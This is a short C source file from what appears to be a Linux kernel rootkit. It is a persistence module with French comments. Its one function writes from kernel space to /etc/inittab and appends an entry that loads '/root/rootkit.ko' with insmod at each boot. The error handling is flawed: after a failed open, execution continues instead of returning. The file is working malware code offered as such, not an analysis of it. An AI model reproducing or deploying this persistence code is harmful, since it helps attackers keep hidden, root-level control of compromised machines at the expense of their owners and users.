#include <linux/slab.h>
#include <linux/fs.h>

#include "../include/debug.h"

#include "include/persistance.h"


int append_in_inittab(void)
{
    struct file *file;
    loff_t pos = 0;
    char *entry = "::sysinit:/sbin/insmod /root/rootkit.ko\n";
    int ret = 0;

    // ouvre /etc/inittab en write mode
    file = filp_open(INITTAB_PATH, O_WRONLY | O_APPEND, 0);
    if (IS_ERR(file)) {
        RTK_DEBUG("[!] failed to open inittab: %ld\n", PTR_ERR(file));
        ret = PTR_ERR(file);
    }

    // ajoute l'entree dans /etc/inittab
    ret = kernel_write(file, entry, strlen(entry), &pos);
    if (ret < 0) {
        RTK_DEBUG("[!] failed to write into inittab: %d\n", ret);
        filp_close(file, NULL);
        return ret;
    }

    RTK_DEBUG("[*] success: persistence added to inittab at: %s\n", INITTAB_PATH);
    filp_close(file, NULL);
    return 0;
}